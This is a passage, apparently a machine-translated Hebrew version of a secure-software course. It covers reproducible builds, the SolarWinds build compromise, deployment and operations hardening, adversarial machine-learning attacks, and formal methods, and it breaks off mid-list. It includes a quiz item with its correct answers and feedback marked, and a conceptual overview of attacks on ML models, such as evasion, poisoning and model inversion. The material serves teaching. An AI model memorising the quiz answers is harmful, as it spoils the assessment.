מבנים רבים ניתנים לשחזור ללא כל שינוי, עם זאת, חלקם לא. הצעד הראשון ביצירת גירסת Build הניתנת לשחזור הוא לעתים קרובות לוודא שאם אתה מבצע את אותה גירסת Build פעמיים במערכת SAM היא מפיקה את אותה תוצאה (גירסת Build הניתנת לחזרה ** ). שימוש בתמונת גורם מכיל (כגון תמונת Docker) או בתמונה וירטואלית עבור הסביבה יכול לסייע ביצירת סביבה עקבית לביצוע גירסאות Build הניתנות לשחזור. הנה כמה אתגרים נפוצים ביצירת גירסאות Build הניתנות לשחזור:

* תוצאת הבנייה עשויה לכלול חותמות תאריך/שעה. אם לא ניתן להסיר אותם בקלות, פתרון נפוץ הוא להשתמש בשינוי האחרון של משהו (בדרך כלל קוד המקור) כדי להגדיר את חותמות התאריך/זמן בכל תוצאה (באמצעות מנגנונים כגון `SOURCE_DATE_EPOCH` משתנה הסביבה).
* ערכים מסוימים יכולים להיות בסדר "שרירותי" (למשל, עקב ביצוע מקביל). פתרון נפוץ הוא למיין את התוצאות (למשל, באופן לקסיקוגרפי).

מידע נוסף על אופן היצירה של גירסאות Build הניתנות לשחזור זמין; ראה [ "תיעוד" מתוך פרויקט בנייה ניתנת לשחזור](https://reproducible-builds.org/docs/).

>  שעת סיפור: חתרנות במערכת הבנייה של SolarWinds Orion

> אוריון היא חבילת תוכנה לניהול רשתות ארגוניות מבית SolarWinds הכוללת ניטור ביצועים ויישומים, כמו גם ניהול תצורת רשת. בשנת 2020 שחקן איום שינה את מערכת הבנייה של אוריון כך שגרסאות בנויות של אוריון יכללו קוד זדוני. מערכת חתרנית זו נחתמה לאחר מכן על ידי אישור חתימת הקוד הלגיטימי של SolarWinds. החתרנות הזאת היתה מזיקה מאוד; הסוכנות לאבטחת סייבר ואבטחת תשתיות של ממשלת ארה"ב (CISA) אף הוציאה הנחיית חירום ("[הוראת חירום 21-01]](<https://www.cisa.gov/emergency-directive-21-01>)" מ-CISA). אמצעי אבטחה רבים לא יכלו לעבוד במקרה זה; "קוד סקירה" לא עבד (השינוי הוכנס על ידי מערכת הבנייה ולכן לא נראה על ידי המפתחים שלה), "לבדוק חתימות" לא עבד (זה היה חתום באופן לגיטימי), וניטור אחר בעיות לא עבד במשך זמן מה (כי בארגונים רבים זה היה מערכת הניטור). לקבלת מידע נוסף, ראה [התראה AA20-352A](https://www.cisa.gov/emergency-directive-21-01) מ- CISA ו["מניעת התקפות שרשרת אספקה כמו SolarWinds](https://linuxfoundation.org/blog/preventing-supply-chain-attacks-like-solarwinds/)" מאת דיוויד א. וילר.

 הקשחת צינור CI/CD מפני גישה לא מורשית, קוד זדוני או פגיעה במערכת היא חלק מ-2021 OWASP Top 10 #8 (A08:2021), *כשלים בתקינות תוכנה ונתונים*.

### הפצה, שטח/פריסה, תפעול וסילוק

שום קורס לא יכול ללמד הכל. קורס זה מתמקד *בפיתוח* תוכנה מאובטחת, כולל הפצתה. בכוונה לא התמקדנו בתהליכים לאחר הפיתוח, כולל הפצה, שטח (פריסה), תפעול וסילוק של תוכנות. סיבה אחת היא שיש כבר הרבה מסמכים והנחיות שמנסים לעזור לאנשים לעשות זאת בצורה מאובטחת, אך מאמצים אלה נפגעים מכיוון שהם מנסים לסובב את כפתורי התצורה כדי להפוך תוכנה לא מאובטחת לתוכנה מאובטחת. זה בדרך כלל הרבה יותר יעיל, אם אתה רוצה מערכת מאובטחת, להתחיל עם תוכנה מאובטחת.

כמובן, הפצה, פריסה, תפעול וסילוק כל העניין. פרויקטים רבים מיישמים גישת DevOps או DevSecOps, אשר משלבת במכוון תהליכים אלה יחד עם פיתוח. גם אם הפיתוח נעשה על ידי קבוצה אחרת, הפצה מאובטחת, שטח, תפעול וסילוק הם קריטיים כדי שהתוכנה תהיה מאובטחת בעולם האמיתי. אז אמנם הקורס הזה לא מתמקד בתהליכים האלה, אבל הנה כמה טיפים על התהליכים האלה שעשויים לעזור לכם.

בעת ההפצה:

* השתמש ב- HTTPS (TLS), כך שאנשים יוכלו לוודא שזהו התחום המיועד ולא ניתן לטפל במידע בין השרת לנמען.

* כאשר הדבר מעשי, חתום על המידע המבוזר באמצעות מפתח פרטי *שאינו* זמין לשרת המפיץ את התוכנה. באופן אידיאלי מהדורות תוכנה צריכות להיות חתומות על ידי מפתח פרטי שלעולם אינו זמין באינטרנט. זה מאפשר אימות חיצוני (באמצעות המפתח הציבורי המתאים) גם אם השרת נמצא בסכנה. למרבה הצער, זה דורש להבטיח כי מפתחות ציבוריים מופצים באופן מאובטח למקלטים. במקרים מסוימים, הקפדה על כך שלמקלטים יש את המפתחות הציבוריים הנכונים יכולה להיות בעיה מאתגרת, בעוד שבמקרים אחרים זה קל. פתרון נפוץ לעדכוני תוכנה הוא לקבל עדכון אם הוא חתום על-ידי אותו מפתח שחתם על הגירסה המותקנת כעת של התוכנה. פרויקט sigstore פועל לפיתוח דרכים קלות יותר לחתום ולאמת ממצאי תוכנה; לקבלת מידע נוסף, ראה <https://www.sigstore.dev/>.

* אם אתה מפיץ יישום, דאג לעדכן אותו כברירת מחדל (אם כי אפשר למשתמש לעקוף זאת). משתמשים לעתים קרובות לא יעדכנו אלא אם כן זה אוטומטי. קיים סיכון שתוקף עלול לחתור תחת תהליך הבנייה או ההפצה שלך, לכן הגן על תהליכים אלה וודא שעדכונים יתקבלו רק אם הם חתומים על-ידי מפתח פרטי שלעולם אינו מחובר לאינטרנט.

שים לב שהדיון הקודם שלנו על רכישת תוכנה דן בבעיות הפצה מהצד הנגדי. כלומר, בעת רכישת תוכנה אתה רוצה להבטיח שתקבל את מה שהיית אמור לקבל, ובעת הפצת תוכנה אתה רוצה להקל על הנמענים לאמת זאת.

שוב, שקול את ההמלצות של רמות שרשרת אספקה עבור תוצרי תוכנה, או SLSA ("סלסה"), ב- <https://slsa.dev/>.

בעת שדה/פריסה:

* הגדר את סביבת הייצור שלך כך שתהיה מאובטחת, כולל כל הרכיבים שאתה תלוי בהם, ושמור על עדכניותה. לדוגמה:

  * יש להגדיר את הסביבה שלך כך שתספק הרשאות מינימליות ותשתמש בהגדרות אבטחה מרביות שהמערכת שלך מאפשרת.

  * היזהר מ *"תצורות ברירת מחדל לא מאובטחות, תצורות לא שלמות או אד הוק, אחסון ענן פתוח, כותרות HTTP שגויות והודעות שגיאה מילוליות המכילות מידע רגיש"* (כפי שמציין OWASP).

  * הקשיח את הסביבה שלך על-ידי הפעלה מרבית של אמצעי נגד לאבטחה וסילוק רכיבים שאינם בשימוש (כך שלא ניתן יהיה לנצל את הפגיעויות שלהם). רכיבים אלה כוללים את מערכות ההפעלה שלך, מערכות מסדי נתונים, צג של מכונות וירטואליות, מכונות וירטואליות, תשתית זמן ריצה של גורמים מכילים, גורמים מכילים וכל דבר אחר שבו אתה משתמש או תלוי בו. ישנם מסמכים רבים הדנים כיצד להקשיח רכיבים שונים; השתמש בהם!

  * היכן שזה סביר, לאפשר עדכונים אוטומטיים.

* הימנע ממתן גישה ישירה למסד הנתונים שלך, אלא אם כן הדבר נחוץ ** ווידאת שהוא מאובטח.

* ודא שלכל ערכות הנתונים יש ** הרשאות מוגבלות. בפרט, אם אתה משתמש במיכלי AWS S3 עבור נתונים שאינם ציבוריים, ודא שיש להם גישה מוגבלת מאוד (דליי S3 רבים עם נתונים שאינם ציבוריים הפכו לקריאים לציבור).

* היכן שזה הגיוני, אפשר הצפנת דיסק מלאה ו/או הצפנת מסד נתונים.

* אפשר מערכות ניטור שיתריעו בפניך, או יתעדכנו באופן אוטומטי, כאשר לרכיב שנמצא בשימוש יש פגיעות ידועה.

* הפעל את הרישום ונתב אותו מחדש למיקום מוגן מרכזי לצורך ניטור. אפשר למערכות אוטומטיות לזהות ולהתריע על בעיות אבטחה אפשריות.

בעת ההפעלה:

* עדכן רכיבים בזמן (פעולה זו נקראת לעתים *תיקון וניהול פגיעויות*). בארגונים מסוימים תפקיד זה מתחלק בין מפתחים המעדכנים רכיבים בתוך יישום לבין אופרטורים המעדכנים רכיבים חיצוניים התלויים ביישום. לא משנה איך אתה עושה את זה, רכיבים צריכים להיות מעודכנים בזמן או תוקף יוכל לנצל אותם.

* בדוק אזהרות ו/או יומנים באופן שגרתי. קבע אילו מהם הם אינדיקטורים לתקרית.

* הגיבו בזמן לתקריות.

* לאחר שפגיעות או תקרית נפתרת, השתמש בניתוח סיבת הבסיס כדי להבין *מדוע היא קרתה* כדי  שניתן יהיה לבצע שינויים כדי למנוע הישנות דומה.

* צור גיבויים ואחסן אותם בצורה מאובטחת (תוקפים אוהבים לקבל עותקים של גיבויים). בדוק כדי להבטיח שתוכל להתאושש מהם. ודאו שיש לכם גיבויים לא מקוונים ("קרים") כדי להתמודד עם תוכנות כופר (שפורצות פנימה, מצפינות את הנתונים שלכם ומחזיקות אותם תמורת כופר).

* כאשר אתה מקבל דוח פגיעות, עבד ותקן אותו בזמן. לאחר מכן תן לכתב קרדיט ציבורי, אלא אם כן הכתב מבקש אחרת.

בעת ההשלכה, ודא שאתה משמיד לחלוטין את כל הנתונים שאתה אמור להשמיד. רק הסרת קובץ אינה מסירה למעשה את תוכנו מרוב התקני האחסון.

 תצורה שגויה של אבטחה היא טעות נפוצה כל כך ביישומי אינטרנט שהיא 2017 OWASP Top 10 #6 ו- 2021 OWASP Top 10 #5.  הגנה על פונקציונליות העדכון האוטומטי נחשבת לחלק מ- 2021 OWASP Top 10 #8 (A08:2021), *כשלים בתקינות תוכנה ונתונים*. שימוש ברכיבים עם פגיעויות ידועות הוא פגיעות נפוצה כל כך של יישום אינטרנט שהוא 2017 OWASP Top 10 #9. שימוש ברכיבים פגיעים ומיושנים הוא 2021 OWASP Top 10 #6. *כשלי רישום וניטור אבטחה* הוא 2021 OWASP Top 10 #9. * רישום וניטור לא* מספיקים הוא 2017 OWASP Top 10 #10.

#### חידון 4.3: הפצה, שטח/פריסה, תפעול וסילוק

\>\>בחר את המשפטים הנכונים:<<

[!x] אל תיתן גישה ישירה למערכת מסד הנתונים שלך אלא אם כן הדבר נחוץ ** ווידאת שהיא מאובטחת.

[x] בפעולות, הפעל רישום וניתוב מחדש של רישום יומן הרישום למיקום מוגן מרכזי לצורך ניטור.

[ ] תקן כל בעיית אבטחה במהירות, ולאחר מכן פשוט עבור לבעיות אחרות. {{ נבחר: לא, לאחר שתתקן בעיית אבטחה (תקרית), עליך גם לנסות לברר *מדוע* היא קרתה ("ניתוח סיבת בסיס") כדי שתוכל לתקן את הסיבה הבסיסית. אחרת, יש סיכוי טוב כי בעיות דומות ימשיכו לקרות. }}

### בינה מלאכותית (AI), למידת מכונה (ML) ואבטחה

בינה מלאכותית (AI) היא אינטליגנציה המודגמת על ידי מכונות
(אינטליגנציה של בני אדם ובעלי חיים נקראת לפעמים אינטליגנציה טבעית).
למידת מכונה (ML) היא תחום חקירה המוקדש ל
הבנה ובנייה של שיטות ש'לומדות', כלומר,
שיטות הממנפות נתונים כדי לשפר את הביצועים בקבוצה מסוימת של משימות
(*למידת מכונה*, טום מיטשל).
ML נחשב לעתים קרובות לתת-קבוצה של בינה מלאכותית.
כמות משמעותית של עבודת אבטחת בינה מלאכותית מתמקדת כיום ב-ML;
ניקח את אותו הפוקוס כאן.

בניית מערכות ML כרוכה לעתים קרובות במספר תהליכים, כלומר
הדרכה, בדיקה והסקה. הסקה היא כאשר מערכת ML היא
המשמש את המשתמשים שלה.
פרויקטים רבים של ML הניחו סביבה סגורה ומהימנה שבה
אין איומים ביטחוניים.
עם זאת, הנחה זו היא לעתים קרובות לא מציאותית.

*למידת מכונה יריבה* היא מערך המאמצים
להגן על צינור ML כדי להבטיח את אבטחתו במהלך האימון,
בדיקה, והסקה.
זהו תחום לימוד פעיל, והטרמינולוגיה משתנה.
עם זאת, ישנם סוגים רבים של התקפות פוטנציאליות על מערכות ML, כולל:

* *התחמקות* ("לעשות/להסיק את הדבר הלא נכון").
  בהתקפת התחמקות, התוקף מספק קלט שונה ל
  מסווג של מערכת ML במהלך הסקה כך שהוא מסווג באופן שגוי
  תוך שמירה על שינוי קטן ככל האפשר
  (ניקולאי ואחרים, 2019).
  לדוגמה, תוקף עשוי ליצור סימונים עדינים בדרך אל
  לשכנע מכונית בנהיגה עצמית לסטות באופן בלתי צפוי לתוך התנועה המתקרבת.
  תשומות כאלה שהשתנו נקראות לעתים *תשומות יריבות*.
  כניסות יריבות יכולות לאפשר לתוקף לשלוט במערכת בהתאם
  המסווג.
  לפיכך, התקפה מסוג זה עלולה להוביל לאובדן שלמות ו/או זמינות.
* *הרעלה* ("ללמוד את הדבר הלא נכון").
  בהתקפת הרעלה, התוקף מתמרן נתונים שישמשו כ
  נתוני אימון, למשל, כדי להפחית ביצועים, לגרום לסיווג שגוי ו/או
  הוספת דלתות אחוריות
  (ניקולאי ואחרים, 2019).
  מערכות ML זקוקות בדרך כלל לכמות גדולה של נתוני אימון;
  תוקפים מסוימים עשויים אפילו ליצור או לתמרן באופן זמין לציבור
  נתונים אם סביר להניח שהם ישמשו בסופו של דבר לאימון.
  התקפה מסוג זה עלולה להוביל לאובדן שלמות ו/או זמינות.
* *אובדן סודיות* ("לחשוף את הדבר הלא נכון").
  ייתכן שתוקף יוכל להשתמש בתוצאות שאילתה כדי לחשוף מידע מוסתר.
  לפיכך, סוג זה של התקפה עלול להוביל לאובדן סודיות.
  סוג זה של התקפה יכול להיות מחולק עוד יותר, למשל:
  * *מיצוי*.
      בהתקפת חילוץ, התוקף מחלץ את הפרמטרים או
      מבנה המודל מתוך תצפיות על תחזיות המודל
      (טבאסי 2019).
  * *(חברות) היסק.*
      בהתקפת הסקה של חברות, התוקף
      משתמש בתוצאות שאילתת מודל יעד כדי לקבוע אם ספציפי
      נקודות נתונים שייכות לאותה התפלגות כמו ערכת נתוני האימון
      (טבאסי 2019).
  * *(דגם) היפוך*.
      בהתקפת היפוך, התוקף מסוגל
      שחזור (חלק) של נתונים המשמשים לאימון המודל, כולל
      נתונים פרטיים ו/או סודיים (Tabassi 2019).

(קרדיט: התיאורים הפשוטים המוצגים לעיל בסוגריים ובמרכאות כפולות
נטבעו על ידי ד"ר ג'ף אלסטוט.)

העבודה התמקדה במיוחד במאבק בהתחמקות
(כניסות יריבות) במערכות ML.
למרבה הצער, גישות רבות שנראות ** כמנוגדות להתחמקות אינן מצליחות
נגד תוקפים שאינם נאיביים.
הנה כמה גישות לדוגמה שאינן פועלות נגד תוקפים נחושים:

* *אימון יריב* יוצר תשומות יריבות, ואז מאמן את
  מודל על תשומות אלה. זה יכול לשפר את החוסן, אבל תוקף יכול
  פשוט לחזור על תהליך זה לעתים קרובות יותר מאשר המגן.
* *תיוג Null* מנסה לאמן מודל שסביר להניח שכניסות מסוימות
  יריב (ויש לסווג כתוצאות "ריקות").
  שוב, זה נראה חלש מול יריבים נחושים, כפי שהוסבר
  מאת קרליני ווגנר
  ("דוגמאות יריבות אינן ניתנות לזיהוי בקלות:
  עקיפת עשר שיטות גילוי" מאת ניקולס קרליני ודוד וגנר, 2017.)

כלי אחד שעשוי להועיל הוא
ארגז כלים לעמידות יריבה (ART)
<https://github.com/Trusted-AI/adversarial-robustness-toolbox/wiki/>.
הפוסט
[שלב התקפות יריבות בצנרת אימון מודלים](https://developer.ibm.com/patterns/integrate-adversarial-attacks-model-training-pipeline/),
מאת סינג ואחרים,
מספק דוגמה לאופן שבו ניתן לשלב ART בצינור גדול יותר.
עם זאת, לפני השימוש בכל כלי שאתה צריך לקבוע אם הוא יעיל מספיק
לנסיבות שלך.

ML יריב הוא תחום מחקר פעיל.
לפני השימוש באמצעי נגד,
קבע אם אמצעי הנגד יהיו מתאימים למטרותיך.
אמצעי נגד רבים פועלים רק נגד תוקפים תמימים שאינם
לפצות על אמצעי נגד.
בהתאם למטרות שלך,
ייתכן שלא יהיה *שום* אמצעי נגד שמנטרל כראוי את התוקפים
בביטחון נאות.
** אמצעי נגד רבים הוצעו ומאוחר יותר נמצאו כלא מספקים.
מאמר אחד הדן כיצד להעריך אמצעי נגד הוא על ידי
[ניקולס קרליני, אניש אתלי, ניקולס פפרנו ואחרים, "על הערכת חוסן יריב", 2019-02-20](https://arxiv.org/pdf/1902.06705).
אנו מקווים שבעתיד יהיו אמצעי נגד טובים יותר עם
יותר ביטחון כלל-תעשייתי.

### שיטות פורמליות

כיום רוב התוכנות צריכות להיות מפותחות כדי להיות מאובטחות "באופן סביר" או "הולם". קורס זה התמקד בטכניקות שיעזרו לך לעשות זאת. עם זאת, אם זה *קריטי מאוד* שהתוכנה שלך תעמוד בקריטריונים מסוימים - כגון כמה קריטריוני אבטחה - יש גישה נוספת שעליך להיות מודע לה: *שיטות פורמליות*.

שיטות פורמליות הן שימוש ב*"טכניקות וכלים קפדניים מבחינה מתמטית למפרט, תכנון ואימות של מערכות תוכנה וחומרה", *כאשר  "קפדני מבחינה מתמטית" * פירושו כי  "*מפרטים הם משפטים בנויים היטב בלוגיקה מתמטית וכי האימותים הפורמליים הם ניכויים קפדניים בלוגיקה * זו[אם בכלל]"* ([*מהן שיטות פורמליות?*](https://shemesh.larc.nasa.gov/fm/fm-what.html) מאת ריקי ו. באטלר)., בקיצור, שיטות פורמליות מיישמות מתמטיקה על תוכנה.

היתרונות הגדולים של שיטות פורמליות הם כי:

* אתה יכול לחסל מקורות רבים של עמימות.

* אתה  יכול *להוכיח* שדברים מסוימים נכונים או לא נכונים, בהינתן הנחות מסוימות (ואתה יכול להחליט מהן ההנחות).

החסרונות הגדולים של שיטות פורמליות הם כי:

* שימוש בשיטות פורמליות לפיתוח תוכנה כיום דורש לעתים קרובות מאמץ רב יותר.

* במקרים רבים, שימוש בשיטות פורמליות דורש גם ידע מיוחד (למשל, של מתמטיקה ו/או של כלי השיטות הפורמליות שבהם נעשה שימוש).

אנשים רבים עובדים על פיתוח ושיפור כלים כדי להתגבר על חסרונות אלה.

שיטות פורמליות ** משמשות כיום לפיתוח תוכנה, למשל:

* מהנדסים ב-Amazon Web Services (AWS) משתמשים ב-TLA+ כדי לנתח שירותים, כולל שירות האחסון הפשוט (S3) ו-DynamoDB (מאגר נתונים של NoSQL). לפרטים נוספים, ראו  שימוש בשיטות פורמליות בשירותי האינטרנט של אמזון (2014) וכיצד [*שירותי האינטרנט של אמזון משתמשים בשיטות פורמליות*](https://lamport.azurewebsites.net/tla/formal-methods-amazon.pdf) (2015), מאת כריס ניוקומב, טים ראת', פאן ז'אנג, בוגדן מונטאנו, מארק ברוקר ומייקל דארדאף.[**](https://cacm.acm.org/magazines/2015/4/184701-how-amazon-web-services-uses-formal-methods/fulltext) 

* ליבת מערכת ההפעלה seL4 (ליבת OSS) הוכחה כנכונה.

* יישום s2n של TLS/SSL עבר אימות רשמי של היבטים חשובים וגם אימת באופן רשמי את יישומו של אלגוריתם HMAC ([*חשיבה אוטומטית ואמזון s2n, *](https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/)על ידי Colm MacCarthaigh, 2016).

* פרוטוקולים קריפטוגרפיים מוצעים רבים נבחנים עם בודקי מודלים לניצול אפשרי, וחלק מהכלים מטמיעים גישות שיטות פורמליות לטיפול בסוגים מסוימים של בעיות ([*צמצום דרמטי של פגיעויות תוכנה: דיווח למשרד הבית הלבן למדיניות מדע וטכנולוגיה, *](https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8151.pdf)מאת פול א. בלאק, לי באדג'ר, ברברה גוטמן ואליזבת פונג, 2016).

* הוברט גראבל ([*שיטות פורמליות למערכות מחשבים בטוחות ומאובטחות*](https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Studien/formal_methods_study_875/formal_methods_study_875.pdf?&#95;&#95;blob=publicationFile&v=1), 2013) מספק רשימה גדולה שבה נעשה שימוש בשיטות פורמליות, כמו גם סקירה רחבה יותר על שיטות פורמליות.

עם זאת, שימוש בשיטות פורמליות במהלך פיתוח תוכנה הוא יוצא דופן כיום. אבל שיטות פורמליות עשויות להיות נפוצות יותר בעתיד, או שתתבקש לפתח תוכנה שבה הסיכון מפגיעות הוא גבוה ביותר. אז בחלק זה נספק קצת מודעות קצרה על שיטות פורמליות.

לפני שנעשה זאת, עלינו להבהיר דבר אחד: שיטות פורמליות דורשות תמיד הנחות. אם ההנחות שגויות אז המסקנות שלהן לא בהכרח מחזיקות. לדוגמה, אתה יכול להוכיח שמשהו נכון אם המעבד פועל כראוי; באג במעבד פירושו שההוכחה אינה מחזיקה במקרה זה. זה לא עושה שיטות פורמליות חסרות תועלת, כי הם יכולים לחסל בעיות רבות אחרות, ואתה יכול לבחור מה להניח. אבל חשוב לזכור שכשמישהו אומר "משהו מוכח" זה באמת מוכח בהינתן הנחות מסוימות... וחשוב להבין מהן ההנחות הללו.

#### רמות שיטות פורמליות

בגלל המאמץ הנוסף, שיטות פורמליות מיושמות לעתים קרובות על תת-קבוצה של רכיבים או מאפיינים ספציפיים החשובים במיוחד. שיטות פורמליות ניתן ליישם גם בדרגות שונות. יש טרמינולוגיה משתנה בדרגות אלה, אך דרך אחת היא שלוש הרמות הבאות:

* **רמה 0**<br>נוצר מפרט פורמלי (כלומר, טכניקות מבוססות מתמטית משמשות לתיאור קפדני של מה שהתוכנית אמורה לעשות). לאחר מכן התוכנית מפותחת ממנו באופן לא רשמי. זה נקרא לפעמים *שיטות פורמליות לייט*. גישה זו יכולה לסייע בהסרת עמימות מסוימת.

* **רמה 1**<br>החל את רמה 0 ולאחר מכן הוכח כמה מאפיינים נבחרים מתוך זה או בצע חידוד רשמי מהמפרט לעבר משהו שיהפוך לתוכנית.

* **רמה 2**<br>הוכח באופן מלא את הטענות של תוכנית, כולל בדיקה מכנית שלה. זה מספק את התוצאות החזקות ביותר, אבל גם דורש את המאמץ הרב ביותר.

#### כיצד ניתן ליישם מתמטיקה?

ישנן דרכים רבות ושונות ליישם את המתמטיקה, ולכן ישנן דרכים רבות ושונות להשתמש בשיטות פורמליות. בואו נסתכל בקצרה על כמה מושגים מתמטיים נפוצים המשמשים בשיטות פורמליות.

##### ביטויים בוליאניים

כלי נפוץ הוא הרעיון של ביטויים בוליאניים. ביטויים אלה הם נכונים או שקריים, ויכולים לכלול *חיבורים שונים (* טענה היא פשוט משהו שהוא נכון או שקרי). להלן הצעות חיבור נפוצות. שלושת הראשונים צריכים להיות מוכרים לך מאוד, שכן שפות תכנות העתיקו אותם ממתמטיקה, אבל הסימון המתמטי המסורתי שלהם עשוי להיות חדש לך:

1. "x ו- y" (מתמטית "x ∧ y") הוא נכון אם גם x וגם y נכונים, אחרת הוא שקרי.

2. "x או y" (מתמטית "x ∨ y") הוא נכון אם אחד או שניהם x ו- y נכונים; אם שניהם שקריים זה לא נכון.

3. "לא x" (מתמטית "¬x") הוא נכון אם x הוא שקר, והוא שקר אם x הוא נכון.

4. "x→y" ** הוא נכון אם x הוא שקר או  אם y הוא נכון, כלומר, x → y זהה ל- ((לא x) או y). החץ נקרא לעתים קרובות "מרמז". מפעיל זה עשוי להיות חדש לך, אבל חץ זה פשוט מייצג "אם x הוא נכון אז y הוא נכון". זה נקרא באופן רשמי *השלכה חומרית*.

5. "x&harr;y" נכון אם ל-x ול-y יש אותו ערך. זה בעצם "האם ערכים אלה שווים" עבור ערכים בוליאניים. זה נקרא לפעמים כמו "אם ורק אם" (iff).

ייתכן שיהיה לך קל יותר להבין את החיבורים על-ידי עיון בטבלה הבאה. טבלה זו מציגה את התוצאות של חיבורים אלה בהינתן ערכי הקלט האפשריים של x ו- y (בטבלה זו T נכון בעוד F הוא false):

חיבורים פרופוזיציוניים

<table>
  <tr>
    <th>x</th>
     <th>י</th>
     <th>x ∧ y</th>
     <th>x ∨ y</th>
     <th>¬x</th>
     <th>x→y</th>
     <th>X&HARR;Y</th>
  </tr>
  <tr>
     <th>פ</th>
     <th>פ</th>
     <td>פ</td>
     <td>פ</td>
     <td>ה</td>
     <td>ה</td>
     <td>ה</td>
  </tr>
  <tr>
     <th>פ</th>
     <th>ה</th>
     <td>פ</td>
     <td>ה</td>
     <td>ה</td>
     <td>ה</td>
     <td>פ</td>
  </tr>
  <tr>
     <th>ה</th>
     <th>פ</th>
     <td>פ</td>
     <td>ה</td>
     <td>פ</td>
     <td>פ</td>
     <td>פ</td>
  </tr>
  <tr>
     <th>ה</th>
     <th>ה</th>
     <td>ה</td>
     <td>ה</td>
     <td>פ</td>
     <td>ה</td>
     <td>ה</td>
  </tr>
</table>


##### ערכות

כלי מתמטי נפוץ נוסף הוא הרעיון של קבוצות. קבוצה היא פשוט אוסף לא מסודר של אלמנטים, שבו אלמנטים עצמם עשויים להיות קבוצות. לדוגמה, אם אתה אומר S = {4, 5, 6}, זה רק אומר שלקבוצה S יש 3 אלמנטים (במיוחד 4, 5 ו-6). לאחר מכן ניתן להחיל פעולות שונות על ערכות, לדוגמה:

* הפעולה "A ∈ B" חוזרת true אם ורק אם הצד השמאלי A הוא חבר בצד ימין B. אז בהתחשב בהגדרה הקודמת של S, "4 ∈ S" הוא נכון (כי 4 הוא חבר של S), בעוד "7 ∈ S" הוא שקר (כי 7 אינו חבר של S).

* הפעולה "A⊂B" מחזירה true אם ורק אם קבוצה A היא תת-קבוצה של קבוצה B. במילים אחרות, A⊂B הוא נכון אם כל איבר של A הוא גם איבר של B. אז {4,6}⊂S נכון, כי גם 4 וגם 6 הם חברים ב-S.

##### קוונטיפיירים

כלי מתמטי נפוץ שאולי לא ראיתם הוא הרעיון של *קוונטיפיירים*. אלה מחזירים ערכי אמת או שקר בהתבסס על תנאים מסוימים:

* ∀ *ביטוי* X  : זה נכון אם ורק אם הביטוי ** תמיד נכון עבור כל הערכים המותרים של X. זה בעצם "לולאות" על כל ערך X יכול להיות. ∀ (A הפוך) נקרא "לכולם". זה מאפשר לך בקלות לקבוע שמשהו תמיד נכון.

* ∃ *ביטוי* X  : זה נכון אם ורק אם יש ערך מותר כלשהו של X כאשר הביטוי ** נכון. ∃ נקרא "קיים". זה מאפשר לך בקלות לציין שמשהו מתרחש לפחות פעם אחת.

משמעות הדבר היא שאתה יכול להשתמש בביטויים כמו "∀ X (חוקי(X) → well_formed(X))" כדי לומר "עבור כל הערכים של X, אם X חוקי אז X בנוי היטב"... או במילים אחרות, אם X תקף אז X בנוי היטב. שים לב שכל הביטוי הזה נכון אם אנו דנים בנתוני XML.

##### משפטים מתמטיים לעומת העולם האמיתי

ניתן להשתמש במשפטים מתמטיים כדי למדל את העולם האמיתי, אך אל תבלבלו בין הצהרות מתמטיות ככאלה שהן זהות לעולם האמיתי!

בפרט, אתה יכול בקלות ליצור משפטים מתמטיים שאינם מה שאתה באמת מתכוון. לדוגמה, שפות טבעיות משתמשות לפעמים "ו" ו "או" באופן שונה ממה שהגדרנו לעיל. זוהי בעיה במיוחד עבור "או", אשר במתמטיקה ובמחשוב נכון כאשר שני הצדדים נכונים (aka "כולל או"), אבל בשפה טבעית זה לפעמים משתמע כי רק אחד יהיה נכון (aka "בלעדי או"). לדוגמה, במשפט "נלך לסרטים או להצגה הלילה", הדובר כנראה לא אומר שאנחנו יכולים לעשות את *שניהם*. שימוש במתמטיקה יכול להסיר עמימות רבות כאלה, אבל תצטרך להחליט אם הביטוי הזה הוא מה שאתה *מתכוון*. הדרך העמידה במבחן הזמן להתמודד עם בעיה זו היא לגרום לאחרים לסקור את ההצהרות שלך ולדון אם זה מה שהתכוון.

#### כלי שיטות פורמליות

ישנם מספר עצום של כלים התומכים בשיטות פורמליות.

כמעט כל כלי (אפילו מעבד תמלילים!) ניתן להשתמש כדי ללכוד דרישות בצורה רשמית קפדנית. חלק מהכלים נועדו לעשות בדיוק את זה. דוגמה לכלים כאלה היא סגסוגת, אשר נועד להקל על לכידת דרישות רשמית ולעשות כמה בדיקות מהירות.

חלק מהכלים נועדו גם לוודא שהטענות נכונות מתמטית. הסוגים העיקריים הם:

* *משפטים-מוכיחים*<br>אלה מנסים להוכיח מטרות בהינתן הנחות באמצעות רצף של כללים מותרים בלבד. חלקם אוטומטיים לחלוטין בעוד שאחרים אינטראקטיביים. הכלים האינטראקטיביים יכולים להתמודד עם בעיות קשות יותר, אך בדרך כלל קשים יותר לשימוש.

  * משפטים אוטומטיים של OSS הנמצאים בשימוש נרחב כוללים את E ו- SPASS.

  * משפטים אינטראקטיביים של OSS הנמצאים בשימוש נרחב כוללים את Coq ו- Isabelle.

* *פותרי שביעות רצון (SAT) / תיאוריות מודולו SAT (SMT)*<br>אלה לוקחים חבורה של משוואות עם משתנים, ומנסים למצוא קבוצה של ערכים עבור אותם משתנים שהופכת את כל המשוואות למציאות. פותרי SAT מטפלים רק במשתנים בוליאניים ובמשוואות בוליאניות, בעוד שפותרי SMT יכולים לטפל בערכים אחרים. מנהלי חבילות מסוימים משתמשים באופן פנימי בפותר SAT. פותרי OSS SMT הנמצאים בשימוש נרחב כוללים את Z3, CVC4 ו- Alt-Ergo-Free.

* *בודקי מודלים*<br>אלה לוקחים מודל ומראים "באופן ממצה" שהוא נכון בכל המקרים, תוך שימוש בתכסיסי אופטימיזציה רבים כדי להפוך אותו למעשי. בודק מודלים גנרי של OSS הנמצא בשימוש נרחב הוא Spin (התומך בשפה הנקראת ProMeLa). ישנם גם כלים רבים לבדיקת מודלים שתוכננו במיוחד לניתוח תוכניות. לדוגמה, CBMC הוא בודק מודל תחום OSS עבור תוכניות C ו- C++ שיכולות לאמת את בטיחות הזיכרון, לבדוק אם יש חריגות, לבדוק אם קיימות גרסאות שונות של התנהגות לא מוגדרת ותומך בקביעות שצוינו על-ידי המשתמש.

* *פרשנות מופשטת / ביצוע סימבולי (לתוכניות)*<br>תוכניות "ביצוע" אלה תוך שימוש בפישוטים רלוונטיים (פרשנות מופשטת) או בסמלים (ביצוע סמלי).

יש כמה מערכות שיכולות לשלב את הכלים האלה. לדוגמה:

